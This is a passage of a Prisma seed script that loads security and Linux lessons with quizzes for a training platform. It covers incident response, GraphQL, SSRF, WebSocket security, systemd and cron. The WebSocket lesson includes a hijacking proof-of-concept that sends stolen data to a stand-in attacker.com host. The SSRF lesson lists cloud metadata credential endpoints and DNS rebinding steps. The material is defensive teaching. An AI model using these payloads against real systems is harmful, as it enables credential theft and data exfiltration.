**Detection and Analysis**: Identify that an incident has occurred. This involves monitoring alerts from SIEM, IDS, WAF, and application security tools. Developers help by providing context about what normal application behavior looks like.

**Containment, Eradication, and Recovery**: Stop the attack, remove the attacker's access, and restore the system to a secure state. Developers implement emergency patches, rotate compromised credentials, and rebuild affected systems.

**Post-Incident Activity**: Conduct the post-mortem, implement improvements, and update runbooks based on lessons learned.

### Emergency Response Runbooks

Runbooks are step-by-step procedures that guide responders through common incident scenarios. Every development team should have runbooks for:

1. **Data Breach**: Steps to identify exposed data, contain the breach, notify affected users, and comply with regulatory requirements (GDPR 72-hour notification)
2. **Ransomware**: Procedures for isolating affected systems, assessing the scope, and deciding on recovery strategies. Never pay ransom without consulting legal and law enforcement
3. **Credential Compromise**: Steps to identify the scope of compromised credentials, rotate all affected secrets, invalidate sessions, and audit for unauthorized access
4. **Supply Chain Attack**: Procedures for identifying compromised dependencies, isolating affected builds, and restoring from known-good artifacts

### Evidence Preservation

During an incident, preserving evidence is critical for both remediation and potential legal proceedings:

- **Log Preservation**: Export and secure application logs, infrastructure logs, and audit trails. Store them in tamper-evident storage.
- **Memory Dumps**: For suspected compromise, capture volatile memory before rebooting systems. Memory may contain encryption keys, session tokens, and attacker tools.
- **Disk Imaging**: Create forensic images of affected systems before making changes.
- **Chain of Custody**: Document who accessed what evidence and when. Maintain a clear chain of custody to ensure evidence admissibility.

### Containment Strategies

When an active attack is detected, containment is the first priority:

- **Network Segmentation**: Isolate affected systems by modifying firewall rules or security groups
- **Credential Rotation**: Immediately rotate all credentials that may have been exposed
- **Feature Flags**: Use feature flags to disable vulnerable functionality without deploying new code
- **Rate Limiting**: Implement aggressive rate limiting on suspected attack vectors
- **WAF Rules**: Deploy emergency WAF rules to block known attack patterns

### Hands-On Practice

1. **Runbook Creation**: Write an incident response runbook for a SQL injection vulnerability discovered in production. Include steps for detection, containment, evidence collection, remediation, and post-incident verification.
2. **Tabletop Exercise**: Conduct a tabletop exercise with your team simulating a supply chain attack where a popular npm package is compromised. Document the decision points, communication steps, and technical actions taken.
3. **Log Forensics**: Set up a mock incident and practice extracting forensic evidence from application logs. Identify the attacker's entry point, actions taken, and data accessed using log analysis techniques.

### Key Takeaways
- Developers are critical to incident response because they understand application architecture
- Every team should have runbooks for the most common incident scenarios
- Preserve evidence before making changes; maintain chain of custody for forensic integrity
- Use containment strategies like feature flags, credential rotation, and network segmentation
- Post-incident activity must produce concrete improvements tracked to completion

### References & Further Reading
- NIST SP 800-61 Incident Handling Guide: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
- SANS Incident Response Process: https://www.sans.org/white-papers/incident-handlers-handbook/
- OWASP Incident Response Guide: https://owasp.org/www-project-internet-facing-red-teaming/`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL6.id, [
      {
        text: "Which NIST incident response phase involves deploying emergency WAF rules and rotating credentials?",
        answers: [
          { text: "Preparation", isCorrect: false },
          { text: "Detection and Analysis", isCorrect: false },
          { text: "Containment, Eradication, and Recovery", isCorrect: true },
          { text: "Post-Incident Activity", isCorrect: false },
        ],
      },
      {
        text: "What information should a post-mortem timeline include?",
        answers: [
          { text: "Only the final resolution timestamp", isCorrect: false },
          { text: "Chronological list of events from trigger to resolution with timestamps", isCorrect: true },
          { text: "Only the root cause identification", isCorrect: false },
          { text: "Only the financial impact", isCorrect: false },
        ],
      },
      {
        text: "What is the developer primary role during an active security incident?",
        answers: [
          { text: "Writing new features", isCorrect: false },
          { text: "Providing technical context and implementing emergency containment", isCorrect: true },
          { text: "Managing social media communications", isCorrect: false },
          { text: "Conducting legal proceedings", isCorrect: false },
        ],
      },
      {
        text: "Why is chain of custody important when preserving forensic evidence?",
        answers: [
          { text: "It makes evidence admissible in legal proceedings", isCorrect: true },
          { text: "It speeds up the incident response process", isCorrect: false },
          { text: "It prevents the incident from being reported", isCorrect: false },
          { text: "It is only required for international incidents", isCorrect: false },
        ],
      },
    ]);

  }

  // ====================================================================
  // 2. Advanced Web Vulnerabilities
  // ====================================================================
  if (webCourse) {
    const webSec4 = await prisma.section.create({
      data: { courseId: webCourse.id, title: "4. API & Modern Attack Surfaces", order: 4 },
    });

    const webL1 = await prisma.lesson.create({
      data: {
        sectionId: webSec4.id,
        title: "GraphQL Security Vulnerabilities",
        order: 1,
        content: `# GraphQL Security Vulnerabilities

### Learning Objectives
- Understand the unique attack surface introduced by GraphQL APIs compared to REST
- Identify and exploit GraphQL-specific vulnerabilities including introspection abuse, batching attacks, and query depth attacks
- Implement defenses such as query complexity limits, introspection disabling in production, and rate limiting
- Test GraphQL endpoints for authorization bypasses and information disclosure
- Configure secure GraphQL schemas with proper access control and input validation

### GraphQL's Expanded Attack Surface

GraphQL introduces several security considerations that differ fundamentally from REST APIs:

**Introspection**: By default, GraphQL enables introspection queries that allow anyone to discover the entire API schema, including types, fields, queries, mutations, and their relationships. This gives attackers a complete map of your API.

**Nested Queries**: GraphQL allows deeply nested queries that can force the server to traverse complex data relationships. An attacker can craft queries with extreme nesting to cause denial of service.

**Batching**: GraphQL supports query batching, where multiple operations are sent in a single request. This can bypass rate limiting that counts requests rather than operations.

**Flexible Data Fetching**: Clients can request exactly the fields they need, but this also means they can request sensitive fields that were never intended to be exposed through the API.

### Introspection Abuse

The introspection query reveals your entire schema:

\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
\`\`\`

This tells the attacker all available types (User, Admin, InternalConfig), all fields on each type (including sensitive ones like passwordHash, email, role), all available queries and mutations, and field argument types and return types.

**Defense**: Disable introspection in production using \`introspection: process.env.NODE_ENV !== 'production'\` in your Apollo Server configuration.

### Query Depth and Complexity Attacks

GraphQL queries can be nested to create exponential server-side workloads. A deeply nested query with user -> posts -> comments -> author -> posts -> comments -> author can force the server to execute multiple database queries in a cascading pattern. Without limits, a single query can consume all server resources.

**Defenses**:
1. **Query Depth Limiting**: Reject queries that exceed a maximum depth (typically 5-10 levels)
2. **Query Complexity Analysis**: Assign point values to fields and reject queries exceeding a complexity budget
3. **Timeout**: Kill queries that execute longer than a reasonable threshold (e.g., 30 seconds)

### Batching Attacks

GraphQL allows sending multiple operations in one HTTP request. This allows an attacker to attempt 1000 password guesses in a single HTTP request, bypassing rate limiters that count HTTP requests.

**Defense**: Count operations, not requests. Apply rate limiting per operation type and per user.

### Authorization in GraphQL

GraphQL's single endpoint model makes authorization more complex than REST:

- **Field-Level Authorization**: Each field may require different permissions
- **Resolver-Level Checks**: Authorization must be enforced in every resolver, not just at the query level
- **Data Exposure Through Relations**: Even if a query is authorized, related fields may expose data the user should not see

### Hands-On Practice

1. **Introspection Discovery**: Connect to a test GraphQL endpoint and use an introspection query to map the entire schema. Identify three types that contain sensitive fields.
2. **Depth Attack**: Craft a deeply nested query against a vulnerable GraphQL endpoint and observe the server response time. Then implement a query depth limiter and verify it blocks the attack.
3. **Batching Exploit**: Use a GraphQL batching request to attempt 50 login attempts in a single HTTP request. Verify that the rate limiter fails to block the attack, then implement operation-counting rate limiting.

### Key Takeaways
- GraphQL introspection should be disabled in production to prevent schema discovery
- Implement query depth limiting and complexity analysis to prevent denial of service
- Rate limiting must count operations, not HTTP requests, to prevent batching attacks
- Authorization must be enforced at the field level in every resolver
- Use persisted queries or allow-lists to restrict the query surface in production

### References & Further Reading
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- Apollo Server Security: https://www.apollographql.com/docs/apollo-server/security/authentication/
- HowToGraphQL Security: https://www.howtographql.com/advanced/4-security/`,
      },
    });

    await createQuizWithQuestions(prisma, webL1.id, [
      {
        text: "Which GraphQL feature allows attackers to discover the complete API schema?",
        answers: [
          { text: "Query batching", isCorrect: false },
          { text: "Introspection", isCorrect: true },
          { text: "Fragment spreading", isCorrect: false },
          { text: "Subscriptions", isCorrect: false },
        ],
      },
      {
        text: "Why should rate limiting count operations rather than HTTP requests for GraphQL APIs?",
        answers: [
          { text: "GraphQL uses HTTP/2 exclusively", isCorrect: false },
          { text: "Batching allows multiple operations in a single HTTP request", isCorrect: true },
          { text: "GraphQL does not use HTTP at all", isCorrect: false },
          { text: "Operations are always faster than requests", isCorrect: false },
        ],
      },
      {
        text: "What is the recommended maximum query depth for most GraphQL APIs?",
        answers: [
          { text: "1-2 levels", isCorrect: false },
          { text: "5-10 levels", isCorrect: true },
          { text: "20-30 levels", isCorrect: false },
          { text: "Unlimited depth", isCorrect: false },
        ],
      },
      {
        text: "Which defense prevents query complexity denial of service attacks?",
        answers: [
          { text: "Disabling CORS", isCorrect: false },
          { text: "Query complexity analysis with a point budget", isCorrect: true },
          { text: "Using HTTP/1.1", isCorrect: false },
          { text: "Enabling compression", isCorrect: false },
        ],
      },
    ]);

    const webL2 = await prisma.lesson.create({
      data: {
        sectionId: webSec4.id,
        title: "SSRF in Modern Applications",
        order: 2,
        content: `# SSRF in Modern Applications

### Learning Objectives
- Understand Server-Side Request Forgery (SSRF) and why it has become a top web vulnerability
- Identify SSRF attack vectors in URL fetching, webhook integrations, and file import features
- Exploit SSRF to access internal services, cloud metadata endpoints, and database connections
- Implement SSRF defenses including allow-listing, DNS rebinding protection, and network segmentation
- Understand the role of SSRF in cloud environment attacks and credential theft

### What Is SSRF?

Server-Side Request Forgery (SSRF) occurs when an application fetches a resource from a user-supplied URL without sufficient validation. The attacker tricks the server into making requests to internal services, cloud metadata endpoints, or other resources that should not be accessible from the internet.

SSRF was ranked #1 in the OWASP Top 10 2021 (under "Server-Side Request Forgery") because modern web applications frequently fetch external resources: URL previews, webhook delivery, file imports from URLs, payment verification callbacks, and social media embeds.

### Common SSRF Attack Vectors

**URL Preview/Thumbnail Generation**: When a user submits a URL and the server fetches it to generate a preview, the attacker can supply internal URLs like http://169.254.169.254/ for cloud metadata.

**Webhook Integrations**: Applications that send HTTP requests to user-configured webhook URLs can be redirected to internal services.

**File Import from URL**: Features that import files from user-provided URLs (CSV import, image download) are prime SSRF targets.

**PDF Generation**: HTML-to-PDF via Puppeteer or wkhtmltopdf can be exploited to access internal resources.

### Cloud Metadata Exploitation

The most impactful SSRF exploitation targets cloud metadata endpoints:

- **AWS**: http://169.254.169.254/latest/meta-data/iam/security-credentials/
- **GCP**: http://metadata.google.internal/computeMetadata/v1/
- **Azure**: http://169.254.169.254/metadata/instance?api-version=2021-02-01

From these endpoints, attackers can obtain IAM role credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN), instance configuration data, user data scripts that may contain secrets, and network configuration revealing internal service addresses.

### DNS Rebinding Attacks

DNS rebinding bypasses URL validation by resolving a domain to a public IP during validation and then to an internal IP during the actual request:

1. Attacker registers evil.com pointing to a public IP
2. Server validates evil.com resolves to a public IP (passes validation)
3. Attacker changes DNS to resolve evil.com to 127.0.0.1 or 169.254.169.254
4. Server makes the request to the internal address

**Defense**: Resolve DNS once and reuse the resolved IP for both validation and the request.

### SSRF Defenses

1. **URL Allow-Listing**: Maintain a list of permitted domains and IP ranges. Reject all other URLs.
2. **Network Segmentation**: Place internal services on a separate network segment that the application server cannot reach.
3. **Disable Unnecessary URL Schemes**: Only allow http and https. Block file://, gopher://, dict://, and other schemes.
4. **Response Validation**: Even after fetching a URL, validate the response content type and size.
5. **DNS Validation**: Resolve the hostname and verify the IP falls within allowed ranges before making the request.

### Hands-On Practice

1. **Basic SSRF**: Find a URL preview feature in a test application. Use it to access the server's own loopback interface and retrieve the contents of a local file.
2. **Cloud Metadata**: In a cloud environment, craft an SSRF payload that retrieves the IAM role credentials from the metadata endpoint.
3. **DNS Rebinding Setup**: Set up a DNS rebinding attack using a tool like rbndr.us to bypass URL validation.

### Key Takeaways
- SSRF allows attackers to use your server as a proxy to access internal resources and cloud metadata
- Cloud metadata endpoints are the highest-impact SSRF target due to credential exposure
- DNS rebinding can bypass URL validation by changing DNS resolution between validation and request
- Allow-listing trusted domains and network segmentation are the most effective defenses
- Never trust user-supplied URLs; always validate, resolve DNS, and verify IP ranges

### References & Further Reading
- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger SSRF Research: https://portswigger.net/research/server-side-request-forgery
- AWS Metadata Security Best Practices: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html`,
      },
    });

    await createQuizWithQuestions(prisma, webL2.id, [
      {
        text: "What is the AWS cloud metadata endpoint used for SSRF attacks?",
        answers: [
          { text: "https://aws.amazon.com/metadata/", isCorrect: false },
          { text: "http://169.254.169.254/latest/meta-data/", isCorrect: true },
          { text: "http://metadata.aws.internal/", isCorrect: false },
          { text: "http://10.0.0.1/metadata/", isCorrect: false },
        ],
      },
      {
        text: "How does DNS rebinding bypass URL validation?",
        answers: [
          { text: "By encrypting DNS queries", isCorrect: false },
          { text: "By resolving to a public IP during validation and an internal IP during the request", isCorrect: true },
          { text: "By using IPv6 instead of IPv4", isCorrect: false },
          { text: "By disabling DNSSEC", isCorrect: false },
        ],
      },
      {
        text: "Which URL scheme should be blocked to prevent local file access via SSRF?",
        answers: [
          { text: "https://", isCorrect: false },
          { text: "http://", isCorrect: false },
          { text: "file://", isCorrect: true },
          { text: "ftp://", isCorrect: false },
        ],
      },
      {
        text: "What is the most effective defense against SSRF attacks?",
        answers: [
          { text: "Input validation only", isCorrect: false },
          { text: "Allow-listing trusted domains and network segmentation", isCorrect: true },
          { text: "Disabling all outbound requests", isCorrect: false },
          { text: "Using HTTPS for all requests", isCorrect: false },
        ],
      },
    ]);

    const webL3 = await prisma.lesson.create({
      data: {
        sectionId: webSec4.id,
        title: "WebSocket Security",
        order: 3,
        content: `# WebSocket Security

### Learning Objectives
- Understand the WebSocket protocol and its security implications compared to HTTP
- Identify WebSocket-specific vulnerabilities including cross-site WebSocket hijacking and message injection
- Implement authentication, authorization, and input validation for WebSocket connections
- Configure proper origin validation and rate limiting for WebSocket endpoints
- Test WebSocket applications for security vulnerabilities using specialized tools

### WebSocket Protocol Overview

WebSockets provide full-duplex communication over a single TCP connection. Unlike HTTP's request-response model, WebSockets maintain a persistent connection where both the client and server can send messages at any time.

The WebSocket handshake begins as an HTTP request with an Upgrade header:

\`\`\`
GET /ws/chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://example.com
\`\`\`

The server responds with a 101 Switching Protocols status, and the connection is upgraded from HTTP to WebSocket.

### WebSocket-Specific Vulnerabilities

**Cross-Site WebSocket Hijacking (CSWSH)**: Similar to CSRF, but for WebSockets. When a WebSocket server does not validate the Origin header during the handshake, an attacker's website can open a WebSocket connection to the vulnerable server using the victim's cookies:

\`\`\`javascript
// On attacker's website
const ws = new WebSocket('wss://vulnerable-app.com/ws');
ws.onmessage = (event) => {
  fetch('https://attacker.com/steal', { method: 'POST', body: event.data });
};
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'getSensitiveData' }));
};
\`\`\`

**Message Injection**: If WebSocket messages are not validated, an attacker can inject crafted messages to manipulate application state, escalate privileges, or trigger unauthorized actions.

**Denial of Service**: Without rate limiting, an attacker can flood the WebSocket server with messages, consuming bandwidth and processing resources.

**Information Disclosure**: Error messages in WebSocket handlers may leak internal state, database errors, or stack traces.

### Authentication and Authorization

WebSocket authentication presents unique challenges:

1. **Token-Based Auth**: Pass authentication tokens in the initial handshake query string or as the first message after connection. Validate the token before processing any subsequent messages.
2. **Session Cookie Auth**: WebSockets inherit cookies from the same origin during the handshake. Verify the session on the server side before upgrading the connection.
3. **Per-Message Auth**: For high-security applications, authenticate and authorize each message individually.

### Origin Validation

Always validate the Origin header during the WebSocket handshake:

\`\`\`javascript
const wss = new WebSocket.Server({ noServer: true });
server.on('upgrade', (request, socket, head) => {
  const origin = request.headers.origin;
  if (!isAllowedOrigin(origin)) {
    socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
    socket.destroy();
    return;
  }
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});
\`\`\`

Never use a wildcard origin policy for WebSocket servers in production.

### Input Validation and Message Limits

Validate all incoming WebSocket messages:
- **Schema Validation**: Define a JSON schema for each message type and validate incoming messages against it
- **Size Limits**: Reject messages exceeding a reasonable size (e.g., 64KB)
- **Rate Limiting**: Implement per-connection and per-user message rate limits
- **Message Type Restriction**: Only accept message types that the client is authorized to send

### Hands-On Practice

1. **CSWSH Exploitation**: Find a WebSocket endpoint that does not validate the Origin header. Write a proof-of-concept HTML page that opens a WebSocket connection and exfiltrates data.
2. **Message Injection**: Connect to a WebSocket chat application and craft messages that include SQL injection payloads in the username field.
3. **Rate Limit Bypass**: Write a script that sends 1000 WebSocket messages per second to a test endpoint and verify rate limiting enforcement.

### Key Takeaways
- Always validate the Origin header during the WebSocket handshake to prevent cross-site hijacking
- Authenticate connections during the handshake and authorize each message for high-security applications
- Implement message schema validation, size limits, and rate limiting on all WebSocket endpoints
- Use wss:// (TLS) in production to protect WebSocket traffic from interception
- Test WebSocket endpoints with specialized tools like Burp Suite's WebSocket support

### References & Further Reading
- OWASP WebSocket Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- PortSwigger WebSocket Security: https://portswigger.net/web-security/websockets
- MDN WebSocket API: https://developer.mozilla.org/en-US/docs/Web/API/WebSocket`,
      },
    });

    await createQuizWithQuestions(prisma, webL3.id, [
      {
        text: "What is Cross-Site WebSocket Hijacking (CSWSH)?",
        answers: [
          { text: "A DDoS attack on WebSocket servers", isCorrect: false },
          { text: "An attacker's website opening a WebSocket connection using the victim's cookies", isCorrect: true },
          { text: "A man-in-the-middle attack on TLS connections", isCorrect: false },
          { text: "A buffer overflow in WebSocket message parsing", isCorrect: false },
        ],
      },
      {
        text: "Which header should be validated during a WebSocket handshake to prevent CSWSH?",
        answers: [
          { text: "Content-Type", isCorrect: false },
          { text: "Authorization", isCorrect: false },
          { text: "Origin", isCorrect: true },
          { text: "Accept", isCorrect: false },
        ],
      },
      {
        text: "What is the recommended approach for WebSocket authentication?",
        answers: [
          { text: "No authentication needed for WebSockets", isCorrect: false },
          { text: "Authenticate during the handshake and authorize each message", isCorrect: true },
          { text: "Use IP-based authentication only", isCorrect: false },
          { text: "Rely on client-side authentication only", isCorrect: false },
        ],
      },
      {
        text: "Which protection prevents memory exhaustion attacks on WebSocket servers?",
        answers: [
          { text: "CORS configuration", isCorrect: false },
          { text: "Message size limits and rate limiting", isCorrect: true },
          { text: "Enabling gzip compression", isCorrect: false },
          { text: "Using HTTP/2", isCorrect: false },
        ],
      },
    ]);

  }

  // ====================================================================
  // 3. Linux Fundamentals
  // ====================================================================
  if (linuxCourse) {
    const linuxSec4 = await prisma.section.create({
      data: { courseId: linuxCourse.id, title: "4. Advanced Administration", order: 4 },
    });

    const linuxL1 = await prisma.lesson.create({
      data: {
        sectionId: linuxSec4.id,
        title: "systemd Deep-Dive",
        order: 1,
        content: `# systemd Deep-Dive

### Learning Objectives
- Understand the systemd init system and its role as PID 1 in modern Linux distributions
- Write and customize systemd service unit files for application deployment
- Manage system state using systemctl and analyze boot performance with systemd-analyze
- Configure service dependencies, resource limits, and security sandboxing options
- Use systemd timers as a modern replacement for cron jobs

### What Is systemd?

systemd is the init system and service manager for most modern Linux distributions. It replaced the traditional SysVinit system and is responsible for:

- Starting and managing system services at boot and during runtime
- Mounting filesystems and mounting automount units
- Managing network configuration via systemd-networkd
- Handling device events through systemd-udevd
- Providing logging through systemd-journald
- Managing user sessions and login

When Linux boots, the kernel starts systemd as PID 1. systemd then reads its configuration and starts all required services in the correct dependency order.

### Understanding Unit Files

Systemd configuration is organized into unit files. The most common unit types are:

- **.service**: Manages system services (daemons, applications)
- **.socket**: Manages socket activation and IPC
- **.mount**: Manages filesystem mounts
- **.timer**: Schedules tasks (replacement for cron)
- **.target**: Groups units for managing system state

Unit files are stored in three locations:
- \`/usr/lib/systemd/system/\`: Package-installed units (do not edit)
- \`/etc/systemd/system/\`: Administrator-created units (highest priority)
- \`/run/systemd/system/\`: Runtime-generated units (lost on reboot)

### Writing a Service Unit File

Here is a comprehensive service unit file for a Node.js application:

\`\`\`ini
[Unit]
Description=My Node.js Application
Documentation=https://docs.example.com
After=network.target postgresql.service
Wants=postgresql.service

[Service]
Type=simple
User=appuser
Group=appgroup
WorkingDirectory=/opt/myapp
ExecStart=/usr/bin/node /opt/myapp/server.js
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=3

Environment=NODE_ENV=production
EnvironmentFile=/etc/myapp/env

NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/myapp /var/log/myapp
PrivateTmp=true
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX

LimitNOFILE=65536
MemoryMax=1G
CPUQuota=200%

StandardOutput=journal
StandardError=journal
SyslogIdentifier=myapp

[Install]
WantedBy=multi-user.target
\`\`\`

### Managing Services with systemctl

Essential systemctl commands:

- \`systemctl start myapp.service\`: Start a service immediately
- \`systemctl stop myapp.service\`: Stop a running service
- \`systemctl restart myapp.service\`: Stop and start a service
- \`systemctl reload myapp.service\`: Reload configuration without downtime
- \`systemctl enable myapp.service\`: Enable a service to start at boot
- \`systemctl disable myapp.service\`: Prevent a service from starting at boot
- \`systemctl status myapp.service\`: Show service status, recent logs, and process info
- \`systemctl journal -u myapp.service -f\`: Follow live logs for a service
- \`systemctl list-units --type=service --state=running\`: List all running services
- \`systemctl mask myapp.service\`: Completely prevent a service from being started

### Analyzing Boot Performance

systemd-analyze reveals what takes time during boot:

- \`systemd-analyze\`: Show total time spent in kernel and userspace
- \`systemd-analyze blame\`: List all units sorted by initialization time
- \`systemd-analyze critical-chain\`: Show the chain of dependencies that determines boot time
- \`systemd-analyze dot | dot -Tsvg > boot.svg\`: Generate a dependency graph

### Systemd Timers

Timers provide a modern replacement for cron with better logging, dependency management, and accuracy:

\`\`\`ini
[Unit]
Description=Daily cleanup timer

[Timer]
OnCalendar=daily
Persistent=true
RandomizedDelaySec=3600

[Install]
WantedBy=timers.target
\`\`\`

Use \`systemctl list-timers\` to see all active timers and their next trigger times.

### Hands-On Practice

1. **Service Creation**: Write a systemd service unit file for a Python Flask application. Configure it to start after the network is ready, restart on failure, and run with security sandboxing options. Enable it to start at boot.
2. **Boot Analysis**: Run systemd-analyze on your system to identify the five slowest services during boot. Research whether any can be optimized.
3. **Timer Setup**: Replace a cron job that runs a backup script every night with a systemd timer. Configure it to run at 2 AM with a randomized delay of up to 30 minutes.

### Key Takeaways
- systemd is PID 1 and manages all system services, mounts, timers, and logging
- Service unit files define how applications run, including dependencies, security, and resource limits
- Use security sandboxing options (NoNewPrivileges, ProtectSystem, ProtectHome) to harden services
- systemd-analyze helps diagnose boot performance issues
- systemd timers are a more capable replacement for cron

### References & Further Reading
- systemd.io Official Documentation: https://www.freedesktop.org/software/systemd/man/
- Arch Wiki systemd Guide: https://wiki.archlinux.org/title/Systemd
- systemd for Administrators Blog: http://0pointer.de/blog/`,
      },
    });

    await createQuizWithQuestions(prisma, linuxL1.id, [
      {
        text: "What is the first process started by the Linux kernel during boot?",
        answers: [
          { text: "init", isCorrect: false },
          { text: "systemd (PID 1)", isCorrect: true },
          { text: "bash", isCorrect: false },
          { text: "sshd", isCorrect: false },
        ],
      },
      {
        text: "Which systemd security option prevents a service from gaining new privileges?",
        answers: [
          { text: "ProtectSystem=strict", isCorrect: false },
          { text: "NoNewPrivileges=true", isCorrect: true },
          { text: "PrivateTmp=true", isCorrect: false },
          { text: "ProtectHome=true", isCorrect: false },
        ],
      },
      {
        text: "What command shows all systemd timers and their next trigger times?",
        answers: [
          { text: "systemctl list-timers", isCorrect: true },
          { text: "systemctl list-units", isCorrect: false },
          { text: "crontab -l", isCorrect: false },
          { text: "atq", isCorrect: false },
        ],
      },
      {
        text: "Which command shows the total time spent during boot?",
        answers: [
          { text: "systemd-analyze", isCorrect: true },
          { text: "systemctl status", isCorrect: false },
          { text: "uptime", isCorrect: false },
          { text: "dmesg", isCorrect: false },
        ],
      },
    ]);

    const linuxL2 = await prisma.lesson.create({
      data: {
        sectionId: linuxSec4.id,
        title: "Cron, At & Scheduled Tasks",
        order: 2,
        content: `# Cron, At & Scheduled Tasks

### Learning Objectives
- Write and manage cron expressions for recurring scheduled tasks
- Use the at command for one-time scheduled tasks
- Understand cron permissions and security implications
- Configure anacron for systems that are not running 24/7
- Debug scheduled task issues using log files and cron-specific debugging techniques

### Cron Fundamentals

Cron is the traditional Linux task scheduler for recurring jobs. The cron daemon (crond) runs in the background and checks for scheduled tasks every minute.

Cron jobs are defined in crontab files. Each user can have their own crontab, and there is a system-wide crontab at \`/etc/crontab\`.

A crontab entry has five time fields followed by the command:

\`\`\`
# minute (0-59)
# hour (0-23)
# day of month (1-31)
# month (1-12)
# day of week (0-7, 0 and 7 = Sunday)
* * * * * command_to_execute
\`\`\`

Examples:
- \`0 2 * * * /usr/local/bin/backup.sh\`: Run backup at 2 AM daily
- \`*/15 * * * * /usr/local/bin/check-health.sh\`: Run every 15 minutes
- \`0 0 * * 1 /usr/local/bin/weekly-report.sh\`: Run at midnight every Monday
- \`0 8-18 * * 1-5 /usr/local/bin/business-hours-check.sh\`: Run every hour from 8 AM to 6 PM, Monday through Friday

### System Crontab Files

Linux distributions use several system crontab locations:

- \`/etc/crontab\`: System-wide crontab (includes user field)
- \`/etc/cron.d/\`: Package-managed cron jobs (individual files)
- \`/etc/cron.daily/\`: Scripts executed once daily
- \`/etc/cron.hourly/\`: Scripts executed once hourly
- \`/etc/cron.weekly/\`: Scripts executed once weekly
- \`/etc/cron.monthly/\`: Scripts executed once monthly

The scripts in cron.daily, cron.hourly, etc., are executed by the run-parts utility.

### Cron Permissions

- \`/etc/cron.allow\`: If this file exists, only users listed here may use cron
- \`/etc/cron.deny\`: If cron.allow does not exist, users listed here are denied
- Root can always use cron regardless of these files

For security, restrict cron access:
\`\`\`bash
echo "admin" > /etc/cron.allow
echo "backup" >> /etc/cron.allow
\`\`\`

### The at Command

The at command schedules one-time tasks:

\`\`\`bash
# Schedule a task for 10 PM tonight
echo "/usr/local/bin/maintenance.sh" | at 10pm

# Schedule a task for 30 minutes from now
echo "reboot" | at now + 30 minutes

# Schedule for a specific date and time
echo "/usr/local/bin/deploy.sh" | at 9:00 AM 2024-03-15
\`\`\`

Manage the at queue:
- \`atq\`: List pending at jobs
- \`atrm <job_number>\`: Remove a pending at job
- \`at -c <job_number>\`: Display the commands for a pending job

### Anacron

Anacron is designed for systems that are not running continuously (like laptops). It ensures that scheduled tasks eventually run even if the system was off when they were scheduled.

Anacron configuration is in \`/etc/anacrontab\`:

\`\`\`
period  delay  job-identifier  command
1       5      daily-backup   /usr/local/bin/backup.sh
7       25     weekly-report  /usr/local/bin/report.sh
\`\`\`

- **period**: Number of days between runs (1 = daily, 7 = weekly)
- **delay**: Minutes to wait after boot before running
- **job-identifier**: Name for the job (used in timestamp files)

### Environment Variables in Cron

Cron runs in a minimal environment. Important variables to set:

\`\`\`bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=user@example.com
HOME=/home/user
\`\`\`

Always set MAILTO to receive email notifications when cron jobs fail.

### Hands-On Practice

1. **Crontab Setup**: Create a crontab entry that runs a disk space check every hour and sends an email alert if any partition exceeds 80% usage.
2. **Anacron Configuration**: Configure anacron to run a database backup script daily with a 10-minute delay after boot.
3. **Cron Debugging**: Create a cron job that is supposed to run but does not. Debug the issue by checking cron permissions, log files, environment variables, and command path.

### Key Takeaways
- Cron is for recurring tasks with flexible scheduling via five time fields
- The at command handles one-time scheduled tasks
- Always set MAILTO in crontabs to receive error notifications
- Anacron ensures tasks run on systems that are not always powered on
- Cron runs in a minimal environment; explicitly set PATH and other variables

### References & Further Reading
- Crontab Guru (cron expression editor): https://crontab.guru/
- Linux man pages: crontab(5), cron(8), at(1), anacron(8)
- Red Hat Cron Guide: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_basic_system_settings/`,
      },
    });

    await createQuizWithQuestions(prisma, linuxL2.id, [
      {
        text: "What does the cron expression \"0 2 * * *\" execute?",
        answers: [
          { text: "Every 2 minutes", isCorrect: false },
          { text: "At 2:00 AM daily", isCorrect: true },
          { text: "Every 2 hours", isCorrect: false },
          { text: "Twice per day at random times", isCorrect: false },
        ],
      },
      {
        text: "What is the purpose of anacron?",
        answers: [
          { text: "To replace cron entirely", isCorrect: false },
          { text: "To ensure tasks run on systems that are not always powered on", isCorrect: true },
          { text: "To encrypt cron job outputs", isCorrect: false },
          { text: "To distribute cron jobs across multiple servers", isCorrect: false },
        ],
      },
      {
        text: "What file controls which users are allowed to use cron?",
        answers: [
          { text: "/etc/cron.allow", isCorrect: true },
          { text: "/etc/cron.deny", isCorrect: false },
          { text: "/var/spool/cron", isCorrect: false },
          { text: "/etc/passwd", isCorrect: false },
        ],
      },
      {
        text: "Why should you always set MAILTO in a crontab?",
        answers: [
          { text: "To schedule email delivery", isCorrect: false },
          { text: "To receive notifications when cron jobs fail", isCorrect: true },
          { text: "To set the sender address", isCorrect: false },
          { text: "To enable cron debugging", isCorrect: false },
        ],
      },
    ]);

    const linuxL3 = await prisma.lesson.create({
      data: {
        sectionId: linuxSec4.id,
        title: "Log Management & journald",
        order: 3,
        content: `# Log Management & journald

